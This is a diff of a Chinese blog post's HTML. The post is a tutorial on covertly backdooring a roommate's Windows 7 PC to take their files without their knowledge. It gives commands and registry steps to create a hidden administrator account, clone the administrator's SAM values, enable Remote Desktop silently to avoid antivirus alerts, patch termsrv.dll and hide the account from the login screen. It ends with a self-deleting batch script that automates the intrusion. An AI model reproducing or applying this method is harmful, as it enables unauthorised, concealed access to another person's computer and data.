@@ -118,7 +118,8 @@ _hmt.push(['_setPageTag', id, value]);
                 <div class="py-5 z-depth-3 board">
                     <div class="post-content mx-auto">
                         <div class="markdown-body">
-                            <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
+                            <p>原文链接：<a href="https://crazy-wen.github.io/2019/08/30/%E9%9A%90%E8%97%8F%E5%BC%80%E6%9C%BA%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7/" target="_blank" rel="noopener">https://crazy-wen.github.io/2019/08/30/%E9%9A%90%E8%97%8F%E5%BC%80%E6%9C%BA%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7/</a></p>
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
 <p>有一天，我突然想获取你室友电脑上的重要资料，又不想让你室友知道，并在以后也能轻松获取，那怎么办呢？找机会查看他的账户密码？这貌似不太可能，因为windows的密码是经过散列加密的，这种加密技术在技术上来说是不可逆的。在windows 9X时代，由于技术的不完善，用户可以通过某些方式跳过密码登录，抑或删除密码。但是后续的windows均进行了更新，致使无法破解抑或查看密码。</p>
 </blockquote>
 <blockquote>
@@ -127,29 +128,51 @@ _hmt.push(['_setPageTag', id, value]);
 <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><pre><code>Windows 7(被控主机)
 Windows 10</code></pre><h1 id="方法一：创建用户并且在开机时不显示"><a href="#方法一：创建用户并且在开机时不显示" class="headerlink" title="方法一：创建用户并且在开机时不显示"></a>方法一：创建用户并且在开机时不显示</h1><h2 id="win7："><a href="#win7：" class="headerlink" title="win7："></a>win7：</h2><h3 id="创建隐藏的超级用户"><a href="#创建隐藏的超级用户" class="headerlink" title="创建隐藏的超级用户"></a>创建隐藏的超级用户</h3><p>以管理员身份运行命令行</p>
 <pre><code>net user wen$ wen /add   
-net localgroup administrators wen$ /add</code></pre><p>&emsp;&emsp;创建用户名为wen，密码为wen的新用户，$使得新用户使用net user不会显示出来,并将用户提升为管理员权限。此时，我们在控制面板-&gt;用户账户中仍然可以看见创建的新用户,接下来就是让这个用户在控制面板以及系统登入的页面里消失。</p>
+net localgroup administrators wen$ /add</code></pre><blockquote>
+<p>创建用户名为wen，密码为wen的新用户，$使得新用户使用net user不会显示出来,并将用户提升为管理员权限。此时，我们在控制面板-&gt;用户账户中仍然可以看见创建的新用户,接下来就是让这个用户在控制面板以及系统登入的页面里消失。</p>
+</blockquote>
 <blockquote>
 <p>每次执行net命令的时候，系统去注册表的HKLM\SAM\SAM\Domains\Account\Users\Names下面取项值,然后打印在屏幕上，就是你看到的结果,所以，即使你随便在这个项值下面添加一项，也会通过net命令显示出来的。其中的一个小技巧就是如果用户名后面带一个$符号的时候，就不会显示出来，所以，在net命令下隐身很容易的，只要你添加的用户名是以$结尾的就可以了</p>
 </blockquote>
-<h3 id="偷梁换柱，将隐藏账户替换为管理员"><a href="#偷梁换柱，将隐藏账户替换为管理员" class="headerlink" title="偷梁换柱，将隐藏账户替换为管理员"></a>偷梁换柱，将隐藏账户替换为管理员</h3><p>&emsp;&emsp;在注册表中对系统账户的键值进行操作，运行中输入regedit，来到HKEY_LOCAL_MACHINE\SAM\SAM后，会发现无法展开该处所在的键值。这是因为系统默认对系统管理员给予“写入”和“读取控制”权限，没有给予<strong>修改权限</strong>，因此我们没有办法对“SAM”项下的键值进行查看和修改。不过我们可以给予他权限。（单机右建，看到权限，把名叫administrator的用户给予：完全控制以及读取的权限，在后面打勾就行）</p>
-<p>&emsp;&emsp;成功得到注册表操作权限后，我们就可以正式开始隐藏账户的制作了。来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，当前系统中所有存在的账户都会在这里显示，当然包括我们的隐藏账户。点击我们的隐藏账户，在右边显示的键值中的“类型”一项显示为0x3ec，向上来到“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\”处，可以找到“000003EC”这一项，这两者是相互对应的，隐藏用户的所有信息都在“000003EC这一项中。同样的，我们可以找到“administrator”账户所对应的项为“000001F4”。将“wen$”的键值导出为wen$.reg，然后我们将“000001F4”的F值复制到“000003F1”的F值中（就是<strong>替换</strong>）。完成后保存。接下来进入“命令提示符”，输入“net user wen$ /del”将我们建立的隐藏账户删除。最后，将wen$.reg导入注册表，至此，隐藏账户制作完成。</p>
-<p><strong>重启！！</strong><br>发现用户名已经不在登录界面显示</p>
+<h3 id="偷梁换柱，将隐藏账户替换为管理员"><a href="#偷梁换柱，将隐藏账户替换为管理员" class="headerlink" title="偷梁换柱，将隐藏账户替换为管理员"></a>偷梁换柱，将隐藏账户替换为管理员</h3><blockquote>
+<p>在注册表中对系统账户的键值进行操作，运行中输入regedit，来到HKEY_LOCAL_MACHINE\SAM\SAM后，会发现无法展开该处所在的键值。这是因为系统默认对系统管理员给予“写入”和“读取控制”权限，没有给予<strong>修改权限</strong>，因此我们没有办法对“SAM”项下的键值进行查看和修改。不过我们可以给予他权限。（单机右建，看到权限，把名叫administrator的用户给予：完全控制以及读取的权限，在后面打勾就行）</p>
+</blockquote>
+<blockquote>
+<p>成功得到注册表操作权限后，我们就可以正式开始隐藏账户的制作了。来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，当前系统中所有存在的账户都会在这里显示，当然包括我们的隐藏账户。点击我们的隐藏账户，在右边显示的键值中的“类型”一项显示为0x3ec，向上来到“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\”处，可以找到“000003EC”这一项，这两者是相互对应的，隐藏用户的所有信息都在“000003EC这一项中。同样的，我们可以找到“administrator”账户所对应的项为“000001F4”。将“wen$”的键值导出为wen$.reg，然后我们将“000001F4”的F值复制到“000003F1”的F值中（就是<strong>替换</strong>）。完成后保存。接下来进入“命令提示符”，输入“net user wen$ /del”将我们建立的隐藏账户删除。最后，将wen$.reg导入注册表，至此，隐藏账户制作完成。</p>
+</blockquote>
+<p><strong>重启！！</strong><br><strong>发现用户名已经不在登录界面显示</strong></p>
 <h3 id="近在咫尺，开启远程桌面连接服务"><a href="#近在咫尺，开启远程桌面连接服务" class="headerlink" title="近在咫尺，开启远程桌面连接服务"></a>近在咫尺，开启远程桌面连接服务</h3><p>在命令行中输入</p>
 <pre><code>reg delete &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot; /F
-reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot; /v fDenyTSConnections /t REG_DWORD /d 0</code></pre><p>&emsp;&emsp;开启远程桌面服务，发现 “我的电脑”属性-&gt;选中远程-&gt;将”远程桌面”下的”允许用户连接到此计算机” 变成灰色的了，不能修改了。虽然这样方便，但是也很留下痕迹。<br><a href="https://imgchr.com/i/nQ1IC4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1IC4.md.png" alt="nQ1IC4.md.png"></a><br>&emsp;&emsp;网上的方法是修改组策略中的终端服务，但是在win7中，我没有找到这一项，因此，这一项先放一放，日后在研究，</p>
+reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot; /v fDenyTSConnections /t REG_DWORD /d 0</code></pre><blockquote>
+<p>开启远程桌面服务，发现 “我的电脑”属性-&gt;选中远程-&gt;将”远程桌面”下的”允许用户连接到此计算机” 变成灰色的了，不能修改了。虽然这样方便，但是也很留下痕迹。</p>
+</blockquote>
+<p><a href="https://imgchr.com/i/nQ1IC4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1IC4.md.png" alt="nQ1IC4.md.png"></a></p>
+<blockquote>
+<p>网上的方法是修改组策略中的终端服务，但是在win7中，我没有找到这一项，因此，这一项先放一放，日后在研究，</p>
+</blockquote>
 <blockquote>
 <p>如果通过桌面方式开启远程桌面连接，在360安全卫士进行体检后会被提示开启了远程桌面接连,但是通过命令行来开启的话，360是不会给与提示的。</p>
 </blockquote>
-<h3 id="尝试第一次连接"><a href="#尝试第一次连接" class="headerlink" title="尝试第一次连接"></a>尝试第一次连接</h3><p><a href="https://imgchr.com/i/nQ1T29" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1T29.md.png" alt="nQ1T29.md.png"></a><br>&emsp;&emsp;在尝试第一次，发现win10主机连接时，所登陆的用户是administrator的，但同时，win7上的用户也被注销，出现用户登录界面，<strong>这显然很容易被发现</strong>，后来又换了普通用户尝试了几次，结果是一样的，得出结论，<strong>这台计算机只允许一个用户登陆</strong>，因此，下一步是让<strong>多个用户同时登陆</strong></p>
-<p>&emsp;&emsp;运行-&gt;gpedit，打开组策略编辑器，依次展开计算机配置—&gt;管理模板—&gt;Windows组件—&gt;远程桌面服务—&gt;远程桌面会话主机—&gt;连接—&gt;<strong>限制连接的数量，打开限制连接数</strong>，这里未配置时，默认的最大连接数是1.<strong>点击已启用—&gt;允许的RD最大连接数为该为2—&gt;确定</strong>，打开“<strong>远程桌面服务用户限制到单独的远程桌面服务会话</strong>”，<strong>点击已禁用，</strong><br><a href="https://imgchr.com/i/nQ1hUU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1hUU.md.png" alt="nQ1hUU.md.png"></a><br><a href="https://imgchr.com/i/nQ1fET" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1fET.md.png" alt="nQ1fET.md.png"></a></p>
+<h3 id="尝试第一次连接"><a href="#尝试第一次连接" class="headerlink" title="尝试第一次连接"></a>尝试第一次连接</h3><p><a href="https://imgchr.com/i/nQ1T29" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1T29.md.png" alt="nQ1T29.md.png"></a></p>
+<blockquote>
+<p>在尝试第一次，发现win10主机连接时，所登陆的用户是administrator的，但同时，win7上的用户也被注销，出现用户登录界面，<strong>这显然很容易被发现</strong>，后来又换了普通用户尝试了几次，结果是一样的，得出结论，<strong>这台计算机只允许一个用户登陆</strong>，因此，下一步是让<strong>多个用户同时登陆</strong></p>
+</blockquote>
+<blockquote>
+<p>运行-&gt;gpedit，打开组策略编辑器，依次展开计算机配置—&gt;管理模板—&gt;Windows组件—&gt;远程桌面服务—&gt;远程桌面会话主机—&gt;连接—&gt;<strong>限制连接的数量，打开限制连接数</strong>，这里未配置时，默认的最大连接数是1.<strong>点击已启用—&gt;允许的RD最大连接数为该为2—&gt;确定</strong>，打开“<strong>远程桌面服务用户限制到单独的远程桌面服务会话</strong>”，<strong>点击已禁用，</strong></p>
+</blockquote>
+<p><a href="https://imgchr.com/i/nQ1hUU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1hUU.md.png" alt="nQ1hUU.md.png"></a><br><a href="https://imgchr.com/i/nQ1fET" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1fET.md.png" alt="nQ1fET.md.png"></a></p>
 <blockquote>
 <p>下载一个universal termsrv.dll patch。（<strong>破解远程桌面多用户同时连接数限制</strong>）</p>
 </blockquote>
 <p><a href="https://imgchr.com/i/nQ1RbV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/07/nQ1RbV.md.png" alt="nQ1RbV.md.png"></a></p>
 <p><strong><em>此时再进行远程桌面连接，发现可以多用户登陆！！！</em></strong></p>
-<h3 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h3><p>&emsp;&emsp;在后续尝试中，发现一个小BUG，远程连接过一次后，在被控主机切换用户时，会显示wen$已登陆，这样显然会被发现本机已经被渗透了。</p>
-<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>&emsp;&emsp;在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList <strong>（若注册表中没有则自行创建）</strong>下新建DWORD值，名称为wen$,值为0隐藏，值为1显示。再次切换用户，登录界面已经没有隐藏用户。</p>
-<h3 id="制作成批处理文件"><a href="#制作成批处理文件" class="headerlink" title="制作成批处理文件"></a>制作成批处理文件</h3><p>&emsp;&emsp;为了更方便入侵渗透，我按照上述原理制作成.bat文件。</p>
+<h3 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h3><blockquote>
+<p>在后续尝试中，发现一个小BUG，远程连接过一次后，在被控主机切换用户时，会显示wen$已登陆，这样显然会被发现本机已经被渗透了。</p>
+</blockquote>
+<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><blockquote>
+<p>在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList <strong>（若注册表中没有则自行创建）</strong>下新建DWORD值，名称为wen$,值为0隐藏，值为1显示。再次切换用户，登录界面已经没有隐藏用户。</p>
+</blockquote>
+<h3 id="制作成批处理文件"><a href="#制作成批处理文件" class="headerlink" title="制作成批处理文件"></a>制作成批处理文件</h3><p><strong>为了更方便入侵渗透，我按照上述原理制作成.bat文件。</strong></p>
 <pre><code>net user admins$ 1234567 /add
 net localgroup administrators admins$ /add
 Echo HKEY_LOCAL_MACHINE\SAM [1] &gt;&gt;c:/tem.ini
@@ -179,13 +202,16 @@ del c:\1.reg
 del %0</code></pre><blockquote>
 <p>前两行为创建admins$的用户，密码为1234567，并提权<br>Echo<em>类型的命令为将信息写入c:/tem.ini<br>regini</em>类型为修改注册表权限，[1]为完全访问<br>regedit /e导出<br>regedit /s导入<br>del %0:删除自身</p>
 </blockquote>
-<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>&emsp;&emsp;还是无法使用admins$登陆，原因是权限不够，有两种解决办法</p>
+<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p><strong>还是无法使用admins$登陆，原因是权限不够，有两种解决办法</strong></p>
+<ul>
+<li><p>远程连接设置中添加隐藏用户</p>
 <blockquote>
-<p>远程连接设置中添加隐藏用户<br>在.bat文件中加入命令<br>net localgroup Remote Desktop Users admins$ /add</p>
+<p>在.bat文件中加入命令<br>net localgroup Remote Desktop Users admins$ /add</p>
 </blockquote>
-<blockquote>
-<p>替换注册表中的隐藏用户的F值</p>
-</blockquote>
+</li>
+<li><p>替换注册表中的隐藏用户的F值</p>
+</li>
+</ul>
 <p>&emsp;&emsp;虽然可以成功登陆，但是只能登陆一个用户，所以极易被发现，因此还需修改连接数<br>&emsp;&emsp;按照上述原理，修改组策略再运行破解软件就可以达到效果，实际上修改组策略就是修改注册表（不完全是），但是我在网上找了很久，还是不知道<strong>组策略中远程桌面连接服务对应注册表</strong>中的资料，所以暂时先放一放。</p>
 <h3 id="在win20中运行-bat"><a href="#在win20中运行-bat" class="headerlink" title="在win20中运行.bat"></a>在win20中运行.bat</h3><blockquote>
 <p>实验发现，在win10中运行.bat爷爷已达到同样的效果，</p>
